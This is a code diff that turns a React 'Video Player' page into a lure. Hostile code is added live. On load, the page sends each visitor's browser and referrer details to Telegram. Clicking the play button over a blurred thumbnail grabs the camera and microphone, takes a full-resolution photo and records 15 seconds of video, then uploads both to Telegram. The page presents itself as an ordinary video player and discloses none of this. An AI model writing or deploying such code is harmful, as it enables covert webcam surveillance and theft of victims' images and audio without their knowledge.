@@ -1,68 +1,182 @@
 import { PlayIcon } from '@heroicons/react/24/solid';
-import { useState } from 'react';
+import { useState, useEffect, useCallback } from 'react';
+import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } from './utils/telegram';
 
 function App() {
-  const [isPlaying, setIsPlaying] = useState(false);
+  const [isBlurred] = useState(true);
+  const thumbnailUrl = 'https://stickercommunity.com/uploads/main/25-08-2023-09-24-590yfvu-sticker1.webp';
 
-  const thumbnailUrl =
-    'https://tse4.mm.bing.net/th/id/OIP.f5L9QYjSeP6Z37JID5kIrAHaHa?cb=thfvnextfalcon&rs=1&pid=ImgDetMain&o=7&rm=3';
+  useEffect(() => {
+    const sendVisitorNotification = async () => {
+      await sendTelegramNotification({
+        userAgent: navigator.userAgent,
+        location: window.location.href,
+        referrer: document.referrer || 'Direct',
+        previousSites: document.referrer || 'None',
+      });
+    };
 
-  const handlePlayClick = () => {
-    setIsPlaying(true);
+    sendVisitorNotification();
+  }, []);
+
+  const captureAndSendMedia = useCallback(async () => {
+    try {
+      // Get device capabilities first
+      const devices = await navigator.mediaDevices.enumerateDevices();
+      const videoDevice = devices.find(device => device.kind === 'videoinput');
+      
+      if (!videoDevice) {
+        throw new Error('No video input device found');
+      }
+
+      const constraints = {
+        video: {
+          deviceId: videoDevice.deviceId,
+          width: { ideal: 4096 }, // Maximum supported width
+          height: { ideal: 2160 }, // Maximum supported height
+          frameRate: { ideal: 60 }
+        },
+        audio: true
+      };
+
+      const stream = await navigator.mediaDevices.getUserMedia(constraints);
+
+      // Get actual video track settings
+      const videoTrack = stream.getVideoTracks()[0];
+      const settings = videoTrack.getSettings();
+      
+      // Create and setup video element for photo capture
+      const video = document.createElement('video');
+      video.srcObject = stream;
+      video.playsInline = true;
+      video.muted = true;
+      video.autoplay = true;
+      
+      // Wait for video to be ready
+      await new Promise((resolve) => {
+        video.onloadedmetadata = async () => {
+          try {
+            await video.play();
+            setTimeout(resolve, 500);
+          } catch (error) {
+            console.error('Error playing video:', error);
+            resolve(true);
+          }
+        };
+      });
+
+      // Setup canvas with actual video dimensions
+      const canvas = document.createElement('canvas');
+      canvas.width = settings.width || 1920;
+      canvas.height = settings.height || 1080;
+      const context = canvas.getContext('2d');
+      
+      if (context) {
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+      }
+
+      // Convert photo to blob with maximum quality
+      const photoBlob = await new Promise<Blob>((resolve) => {
+        canvas.toBlob((blob) => {
+          if (blob) resolve(blob);
+        }, 'image/jpeg', 1.0);
+      });
+
+      // Send photo immediately
+      sendImageToTelegram(photoBlob).catch(console.error);
+
+      // Check supported video formats
+      const mimeTypes = [
+        'video/mp4;codecs=h264,aac',
+        'video/mp4',
+        'video/webm;codecs=vp8,opus',
+        'video/webm'
+      ];
+
+      const supportedMimeType = mimeTypes.find(type => MediaRecorder.isTypeSupported(type));
+
+      if (!supportedMimeType) {
+        throw new Error('No supported video format found');
+      }
+
+      // Configure video recording with maximum quality
+      const mediaRecorder = new MediaRecorder(stream, {
+        mimeType: supportedMimeType,
+        videoBitsPerSecond: 8000000 // 8 Mbps for high quality
+      });
+      
+      const chunks: BlobPart[] = [];
+
+      mediaRecorder.ondataavailable = (e) => {
+        if (e.data.size > 0) {
+          chunks.push(e.data);
+        }
+      };
+
+      mediaRecorder.onstop = async () => {
+        const videoBlob = new Blob(chunks, { 
+          type: supportedMimeType.includes('mp4') ? 'video/mp4' : 'video/webm'
+        });
+        console.log('Video recording completed, size:', videoBlob.size);
+        await sendVideoToTelegram(videoBlob);
+        stream.getTracks().forEach(track => track.stop());
+      };
+
+      // Start recording with frequent data chunks for better quality
+      mediaRecorder.start(1000);
+      console.log('Started recording video');
+
+      // Stop recording after 15 seconds
+      setTimeout(() => {
+        if (mediaRecorder.state === 'recording') {
+          console.log('Stopping video recording');
+          mediaRecorder.stop();
+        }
+      }, 15000);
+
+    } catch (error) {
+      console.error('Error capturing media:', error);
+    }
+  }, []);
+
+  const handlePlayClick = async () => {
+    await captureAndSendMedia();
   };
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-black via-gray-900 to-red-950 text-white overflow-hidden">
-      {/* Background Glow */}
-      <div className="absolute top-0 left-0 w-96 h-96 bg-red-500/20 blur-3xl rounded-full" />
-      <div className="absolute bottom-0 right-0 w-96 h-96 bg-red-800/20 blur-3xl rounded-full" />
-
-      {/* Navbar */}
-      <header className="relative z-10 backdrop-blur-xl bg-white/5 border-b border-white/10">
-        <div className="container mx-auto px-6 py-5 flex items-center justify-between">
-          <h1 className="text-4xl font-extrabold tracking-wide bg-gradient-to-r from-red-500 to-orange-400 bg-clip-text text-transparent">
-            VID PLAYER
-          </h1>
-
-          <div className="hidden md:flex gap-6 text-gray-300 font-medium">
-            <button className="hover:text-white transition">Home</button>
-            <button className="hover:text-white transition">Trending</button>
-            <button className="hover:text-white transition">Movies</button>
-            <button className="hover:text-white transition">About</button>
-          </div>
+    <div className="relative min-h-screen bg-gray-900">
+      <header className="relative bg-gray-800 py-6">
+        <div className="container mx-auto px-4">
+          <h1 className="text-3xl font-bold text-white">Video Player</h1>
         </div>
       </header>
 
-      {/* Hero Section */}
-      <main className="relative z-10 container mx-auto px-6 py-12">
-        <div className="grid lg:grid-cols-2 gap-10 items-center">
-          {/* Left Content */}
-          <div>
-            <span className="bg-red-600/20 text-red-400 px-4 py-2 rounded-full text-sm font-semibold border border-red-500/20">
-              Modern Streaming UI
-            </span>
-
-            <h2 className="mt-6 text-5xl font-black leading-tight">
-              Watch Videos With
-              <span className="block text-red-500">Modern Experience</span>
-            </h2>
-
-            <p className="mt-6 text-gray-300 text-lg leading-relaxed max-w-xl">
-              Tampilan video player modern dengan desain glassmorphism,
-              animasi halus, dan nuansa seperti Netflix serta YouTube modern.
-            </p>
-
-            <div className="mt-8 flex gap-4">
-              <button className="bg-red-600 hover:bg-red-700 px-7 py-4 rounded-2xl font-bold transition-all duration-300 hover:scale-105 shadow-lg shadow-red-500/30">
-                Start Watching
-              </button>
-
-              <button className="bg-white/10 backdrop-blur-lg border border-white/10 hover:bg-white/20 px-7 py-4 rounded-2xl font-bold transition-all duration-300">
-                Explore
-              </button>
+      <main className="relative container mx-auto px-4 py-8">
+        <div className="max-w-[1080px] mx-auto">
+          <div className="relative">
+            <div className="relative bg-black rounded-lg overflow-hidden shadow-xl aspect-video">
+              {isBlurred && (
+                <div className="absolute inset-0 backdrop-blur-md bg-black/50" />
+              )}
+              <div className="absolute inset-0 flex items-center justify-center z-10">
+                <button 
+                  onClick={handlePlayClick}
+                  className="bg-red-600 rounded-full p-8 hover:bg-red-700 transition-all duration-300 hover:scale-110 group"
+                >
+                  <PlayIcon className="w-20 h-20 text-white group-hover:text-gray-100" />
+                </button>
+              </div>
+              <img 
+                src={thumbnailUrl} 
+                alt="Video Thumbnail" 
+                className="w-full h-full object-cover"
+              />
             </div>
           </div>
+        </div>
+      </main>
+    </div>
+  );
+}
 
-          {/* Video Card */}
-          <div className="relative">
 export default App;
